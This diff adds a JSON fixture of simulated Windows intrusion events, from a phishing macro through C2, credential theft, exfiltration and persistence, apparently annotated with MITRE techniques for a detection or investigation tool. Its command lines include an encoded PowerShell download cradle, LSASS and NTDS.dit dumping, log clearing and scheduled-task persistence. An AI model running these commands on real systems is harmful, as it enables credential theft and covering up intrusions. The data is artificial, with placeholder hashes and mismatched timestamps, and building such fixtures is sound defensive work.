@@ -1,0 +1,374 @@
+{
+  "events": [
+    {
+      "_id": "evt-001",
+      "@timestamp": "2026-04-15T08:23:14.000Z",
+      "event": { "category": ["network"], "action": "connection_attempted", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "source": { "ip": "203.0.113.50", "port": 443 },
+      "destination": { "ip": "192.168.1.101", "port": 49152 },
+      "network": { "protocol": "https", "direction": "inbound" },
+      "url": { "domain": "secure-update.example.com" },
+      "message": "Inbound HTTPS connection from external IP"
+    },
+    {
+      "_id": "evt-002",
+      "@timestamp": "2026-04-15T08:23:18.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "process": { "name": "OUTLOOK.EXE", "pid": 4521, "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"", "parent": { "name": "explorer.exe", "pid": 2104 } },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "message": "User opened Outlook email client"
+    },
+    {
+      "_id": "evt-003",
+      "@timestamp": "2026-04-15T08:24:45.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "process": { "name": "WINWORD.EXE", "pid": 5832, "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jsmith\\Downloads\\Q1_Report.docm\"", "parent": { "name": "OUTLOOK.EXE", "pid": 4521 } },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "file": { "name": "Q1_Report.docm", "path": "C:\\Users\\jsmith\\Downloads\\Q1_Report.docm" },
+      "message": "Word opened macro-enabled document from email attachment"
+    },
+    {
+      "_id": "evt-004",
+      "@timestamp": "2026-04-15T08:24:52.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "process": { "name": "powershell.exe", "pid": 6104, "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "command_line": "powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwLjEwLjEwLjEwAC8AcwB0AGEAZwBlAHIAJwApAA==", "parent": { "name": "WINWORD.EXE", "pid": 5832 } },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "message": "PowerShell spawned by Word with encoded command"
+    },
+    {
+      "_id": "evt-005",
+      "@timestamp": "2026-04-15T08:24:55.000Z",
+      "event": { "category": ["network"], "action": "connection_attempted", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "source": { "ip": "192.168.1.101", "port": 49221 },
+      "destination": { "ip": "10.10.10.10", "port": 80 },
+      "network": { "protocol": "http", "direction": "outbound" },
+      "process": { "name": "powershell.exe", "pid": 6104 },
+      "message": "PowerShell downloading stager from C2"
+    },
+    {
+      "_id": "evt-006",
+      "@timestamp": "2026-04-15T08:25:02.000Z",
+      "event": { "category": ["file"], "action": "creation", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "file": { "name": "updater.exe", "path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\updater.exe", "hash": { "sha256": "a1b2c3d4e5f6789012345678901234567890abcd" } },
+      "process": { "name": "powershell.exe", "pid": 6104 },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "message": "Malicious executable dropped to Temp folder"
+    },
+    {
+      "_id": "evt-007",
+      "@timestamp": "2026-04-15T08:25:08.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "process": { "name": "updater.exe", "pid": 7201, "executable": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\updater.exe", "command_line": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\updater.exe", "parent": { "name": "powershell.exe", "pid": 6104 } },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "message": "Malware beacon executed"
+    },
+    {
+      "_id": "evt-008",
+      "@timestamp": "2026-04-15T08:25:15.000Z",
+      "event": { "category": ["network"], "action": "connection_attempted", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "source": { "ip": "192.168.1.101", "port": 49305 },
+      "destination": { "ip": "203.0.113.100", "port": 443 },
+      "network": { "protocol": "https", "direction": "outbound" },
+      "process": { "name": "updater.exe", "pid": 7201 },
+      "tls": { "server": { "x509": { "subject": { "common_name": "cdn-static.example.net" } } } },
+      "message": "C2 beacon established over HTTPS"
+    },
+    {
+      "_id": "evt-009",
+      "@timestamp": "2026-04-15T08:32:41.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "process": { "name": "whoami.exe", "pid": 7845, "executable": "C:\\Windows\\System32\\whoami.exe", "command_line": "whoami /all", "parent": { "name": "updater.exe", "pid": 7201 } },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "message": "Attacker running whoami for user enumeration"
+    },
+    {
+      "_id": "evt-010",
+      "@timestamp": "2026-04-15T08:33:02.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "process": { "name": "net.exe", "pid": 7901, "executable": "C:\\Windows\\System32\\net.exe", "command_line": "net user /domain", "parent": { "name": "updater.exe", "pid": 7201 } },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "message": "Domain user enumeration via net.exe"
+    },
+    {
+      "_id": "evt-011",
+      "@timestamp": "2026-04-15T08:33:28.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "process": { "name": "net.exe", "pid": 7955, "executable": "C:\\Windows\\System32\\net.exe", "command_line": "net group \"Domain Admins\" /domain", "parent": { "name": "updater.exe", "pid": 7201 } },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "message": "Domain Admins group enumeration"
+    },
+    {
+      "_id": "evt-012",
+      "@timestamp": "2026-04-15T08:45:12.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "process": { "name": "procdump64.exe", "pid": 8102, "executable": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\procdump64.exe", "command_line": "procdump64.exe -accepteula -ma lsass.exe lsass.dmp", "parent": { "name": "updater.exe", "pid": 7201 } },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "message": "LSASS memory dump attempted via Procdump"
+    },
+    {
+      "_id": "evt-013",
+      "@timestamp": "2026-04-15T08:45:18.000Z",
+      "event": { "category": ["file"], "action": "creation", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "file": { "name": "lsass.dmp", "path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\lsass.dmp", "size": 52428800 },
+      "process": { "name": "procdump64.exe", "pid": 8102 },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "message": "LSASS dump file created"
+    },
+    {
+      "_id": "evt-014",
+      "@timestamp": "2026-04-15T09:12:33.000Z",
+      "event": { "category": ["authentication"], "action": "logon", "outcome": "success" },
+      "host": { "name": "SRV-DC01", "ip": ["192.168.1.10"] },
+      "source": { "ip": "192.168.1.101" },
+      "user": { "name": "admin.backup", "domain": "CORP" },
+      "winlog": { "event_id": 4624, "logon_type": 3 },
+      "message": "Network logon with compromised admin credentials"
+    },
+    {
+      "_id": "evt-015",
+      "@timestamp": "2026-04-15T09:12:38.000Z",
+      "event": { "category": ["network"], "action": "connection_attempted", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "source": { "ip": "192.168.1.101", "port": 49512 },
+      "destination": { "ip": "192.168.1.10", "port": 445 },
+      "network": { "protocol": "smb", "direction": "outbound" },
+      "process": { "name": "updater.exe", "pid": 7201 },
+      "message": "SMB connection to Domain Controller"
+    },
+    {
+      "_id": "evt-016",
+      "@timestamp": "2026-04-15T09:13:05.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "SRV-DC01", "ip": ["192.168.1.10"] },
+      "process": { "name": "cmd.exe", "pid": 3104, "executable": "C:\\Windows\\System32\\cmd.exe", "command_line": "cmd.exe /c whoami", "parent": { "name": "services.exe", "pid": 512 } },
+      "user": { "name": "admin.backup", "domain": "CORP" },
+      "message": "Remote command execution on DC"
+    },
+    {
+      "_id": "evt-017",
+      "@timestamp": "2026-04-15T09:15:22.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "SRV-DC01", "ip": ["192.168.1.10"] },
+      "process": { "name": "ntdsutil.exe", "pid": 3256, "executable": "C:\\Windows\\System32\\ntdsutil.exe", "command_line": "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\\ntds\" q q", "parent": { "name": "cmd.exe", "pid": 3104 } },
+      "user": { "name": "admin.backup", "domain": "CORP" },
+      "message": "NTDS.dit extraction via ntdsutil IFM"
+    },
+    {
+      "_id": "evt-018",
+      "@timestamp": "2026-04-15T09:16:45.000Z",
+      "event": { "category": ["file"], "action": "creation", "outcome": "success" },
+      "host": { "name": "SRV-DC01", "ip": ["192.168.1.10"] },
+      "file": { "name": "ntds.dit", "path": "C:\\temp\\ntds\\Active Directory\\ntds.dit", "size": 134217728 },
+      "process": { "name": "ntdsutil.exe", "pid": 3256 },
+      "user": { "name": "admin.backup", "domain": "CORP" },
+      "message": "NTDS.dit database copied"
+    },
+    {
+      "_id": "evt-019",
+      "@timestamp": "2026-04-15T09:17:02.000Z",
+      "event": { "category": ["file"], "action": "creation", "outcome": "success" },
+      "host": { "name": "SRV-DC01", "ip": ["192.168.1.10"] },
+      "file": { "name": "SYSTEM", "path": "C:\\temp\\ntds\\registry\\SYSTEM", "size": 15728640 },
+      "process": { "name": "ntdsutil.exe", "pid": 3256 },
+      "user": { "name": "admin.backup", "domain": "CORP" },
+      "message": "SYSTEM registry hive copied (contains DPAPI keys)"
+    },
+    {
+      "_id": "evt-020",
+      "@timestamp": "2026-04-15T09:25:10.000Z",
+      "event": { "category": ["authentication"], "action": "logon", "outcome": "success" },
+      "host": { "name": "SRV-FS01", "ip": ["192.168.1.20"] },
+      "source": { "ip": "192.168.1.10" },
+      "user": { "name": "admin.backup", "domain": "CORP" },
+      "winlog": { "event_id": 4624, "logon_type": 3 },
+      "message": "Lateral movement to file server"
+    },
+    {
+      "_id": "evt-021",
+      "@timestamp": "2026-04-15T09:25:15.000Z",
+      "event": { "category": ["network"], "action": "connection_attempted", "outcome": "success" },
+      "host": { "name": "SRV-DC01", "ip": ["192.168.1.10"] },
+      "source": { "ip": "192.168.1.10", "port": 49801 },
+      "destination": { "ip": "192.168.1.20", "port": 445 },
+      "network": { "protocol": "smb", "direction": "outbound" },
+      "message": "SMB connection from DC to file server"
+    },
+    {
+      "_id": "evt-022",
+      "@timestamp": "2026-04-15T09:28:33.000Z",
+      "event": { "category": ["file"], "action": "access", "outcome": "success" },
+      "host": { "name": "SRV-FS01", "ip": ["192.168.1.20"] },
+      "file": { "name": "HR_Salaries_2026.xlsx", "path": "\\\\SRV-FS01\\Shares\\HR\\HR_Salaries_2026.xlsx" },
+      "user": { "name": "admin.backup", "domain": "CORP" },
+      "message": "Sensitive HR file accessed"
+    },
+    {
+      "_id": "evt-023",
+      "@timestamp": "2026-04-15T09:29:15.000Z",
+      "event": { "category": ["file"], "action": "access", "outcome": "success" },
+      "host": { "name": "SRV-FS01", "ip": ["192.168.1.20"] },
+      "file": { "name": "Project_Falcon_Roadmap.pptx", "path": "\\\\SRV-FS01\\Shares\\Executive\\Project_Falcon_Roadmap.pptx" },
+      "user": { "name": "admin.backup", "domain": "CORP" },
+      "message": "Sensitive executive file accessed"
+    },
+    {
+      "_id": "evt-024",
+      "@timestamp": "2026-04-15T09:35:40.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "process": { "name": "7z.exe", "pid": 9102, "executable": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\7z.exe", "command_line": "7z.exe a -p staging.7z C:\\Users\\jsmith\\AppData\\Local\\Temp\\exfil\\", "parent": { "name": "updater.exe", "pid": 7201 } },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "message": "Staging data compressed with 7-Zip"
+    },
+    {
+      "_id": "evt-025",
+      "@timestamp": "2026-04-15T09:38:22.000Z",
+      "event": { "category": ["network"], "action": "connection_attempted", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "source": { "ip": "192.168.1.101", "port": 49890 },
+      "destination": { "ip": "203.0.113.100", "port": 443 },
+      "network": { "protocol": "https", "direction": "outbound", "bytes": 157286400 },
+      "process": { "name": "updater.exe", "pid": 7201 },
+      "message": "Large data exfiltration over C2 channel"
+    },
+    {
+      "_id": "evt-026",
+      "@timestamp": "2026-04-15T09:52:18.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "SRV-DC01", "ip": ["192.168.1.10"] },
+      "process": { "name": "wevtutil.exe", "pid": 3512, "executable": "C:\\Windows\\System32\\wevtutil.exe", "command_line": "wevtutil cl Security", "parent": { "name": "cmd.exe", "pid": 3104 } },
+      "user": { "name": "admin.backup", "domain": "CORP" },
+      "message": "Security event log cleared on DC"
+    },
+    {
+      "_id": "evt-027",
+      "@timestamp": "2026-04-15T09:52:22.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "SRV-DC01", "ip": ["192.168.1.10"] },
+      "process": { "name": "wevtutil.exe", "pid": 3518, "executable": "C:\\Windows\\System32\\wevtutil.exe", "command_line": "wevtutil cl System", "parent": { "name": "cmd.exe", "pid": 3104 } },
+      "user": { "name": "admin.backup", "domain": "CORP" },
+      "message": "System event log cleared on DC"
+    },
+    {
+      "_id": "evt-028",
+      "@timestamp": "2026-04-15T09:53:05.000Z",
+      "event": { "category": ["file"], "action": "deletion", "outcome": "success" },
+      "host": { "name": "SRV-DC01", "ip": ["192.168.1.10"] },
+      "file": { "path": "C:\\temp\\ntds" },
+      "process": { "name": "cmd.exe", "pid": 3104 },
+      "user": { "name": "admin.backup", "domain": "CORP" },
+      "message": "NTDS staging directory deleted"
+    },
+    {
+      "_id": "evt-029",
+      "@timestamp": "2026-04-15T09:55:30.000Z",
+      "event": { "category": ["process"], "action": "start", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "process": { "name": "schtasks.exe", "pid": 9450, "executable": "C:\\Windows\\System32\\schtasks.exe", "command_line": "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Users\\jsmith\\AppData\\Local\\Temp\\updater.exe\" /sc daily /st 08:00", "parent": { "name": "updater.exe", "pid": 7201 } },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "message": "Scheduled task created for persistence"
+    },
+    {
+      "_id": "evt-030",
+      "@timestamp": "2026-04-15T09:56:12.000Z",
+      "event": { "category": ["registry"], "action": "modification", "outcome": "success" },
+      "host": { "name": "WS-PC01", "ip": ["192.168.1.101"] },
+      "registry": { "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "WindowsHelper", "data": { "strings": ["C:\\Users\\jsmith\\AppData\\Local\\Temp\\updater.exe"] } },
+      "process": { "name": "updater.exe", "pid": 7201 },
+      "user": { "name": "jsmith", "domain": "CORP" },
+      "message": "Registry Run key added for persistence"
+    }
+  ],
+  "annotations": {
+    "evt-003": {
+      "eventId": "evt-003",
+      "comment": "Initial access via macro-enabled document from phishing email",
+      "mitreTactic": "TA0001",
+      "mitreTechnique": "T1566",
+      "updatedAt": 1713175200000
+    },
+    "evt-004": {
+      "eventId": "evt-004",
+      "comment": "Encoded PowerShell payload executed by Word macro",
+      "mitreTactic": "TA0002",
+      "mitreTechnique": "T1059",
+      "updatedAt": 1713175200000
+    },
+    "evt-007": {
+      "eventId": "evt-007",
+      "comment": "Cobalt Strike beacon deployed",
+      "mitreTactic": "TA0002",
+      "mitreTechnique": "T1055",
+      "updatedAt": 1713175200000
+    },
+    "evt-008": {
+      "eventId": "evt-008",
+      "comment": "C2 channel established over HTTPS to cdn-static.example.net",
+      "mitreTactic": "TA0011",
+      "mitreTechnique": "T1071",
+      "updatedAt": 1713175200000
+    },
+    "evt-011": {
+      "eventId": "evt-011",
+      "comment": "Domain Admins enumeration - attacker identifying high-value targets",
+      "mitreTactic": "TA0007",
+      "mitreTechnique": "T1069",
+      "updatedAt": 1713175200000
+    },
+    "evt-012": {
+      "eventId": "evt-012",
+      "comment": "LSASS credential dumping via Procdump",
+      "mitreTactic": "TA0006",
+      "mitreTechnique": "T1003",
+      "updatedAt": 1713175200000
+    },
+    "evt-015": {
+      "eventId": "evt-015",
+      "comment": "Lateral movement to DC using stolen credentials",
+      "mitreTactic": "TA0008",
+      "mitreTechnique": "T1021",
+      "updatedAt": 1713175200000
+    },
+    "evt-017": {
+      "eventId": "evt-017",
+      "comment": "NTDS.dit extraction - full domain credential theft",
+      "mitreTactic": "TA0006",
+      "mitreTechnique": "T1003",
+      "updatedAt": 1713175200000
+    },
+    "evt-025": {
+      "eventId": "evt-025",
+      "comment": "150MB data exfiltration over encrypted C2",
+      "mitreTactic": "TA0010",
+      "mitreTechnique": "T1041",
+      "updatedAt": 1713175200000
+    },
+    "evt-026": {
+      "eventId": "evt-026",
+      "comment": "Attacker clearing Security logs to hide activity",
+      "mitreTactic": "TA0005",
+      "mitreTechnique": "T1070",
+      "updatedAt": 1713175200000
+    },
+    "evt-029": {
+      "eventId": "evt-029",
+      "comment": "Scheduled task created for daily persistence",
+      "mitreTactic": "TA0003",
+      "mitreTechnique": "T1053",
+      "updatedAt": 1713175200000
+    }
+  }
+}
